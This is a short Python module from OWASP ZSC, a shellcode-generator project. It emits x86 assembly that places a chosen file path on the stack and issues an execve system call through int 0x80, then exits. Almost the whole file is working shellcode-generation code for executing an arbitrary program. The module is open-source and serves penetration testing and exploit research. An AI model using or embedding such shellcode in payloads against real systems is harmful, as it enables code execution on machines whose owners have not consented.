#!/usr/bin/env python
'''
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
'''
from core import stack


def exc(file_to_exec):
    return """
%s
mov    %%esp,%%ebx
xor    %%eax,%%eax
push   %%eax
mov    %%esp,%%edx
push   %%ebx
mov    %%esp,%%ecx
push   %%edx
push   %%ecx
push   %%ebx
mov    $0x3b,%%al
push   $0x2a
int    $0x80
mov    $0x1,%%al
mov    $0x1,%%bl
int    $0x80
""" % file_to_exec


def run(data):
    file_to_exec = data[0]
    return exc(stack.generate(file_to_exec, '%ebx', 'string'))
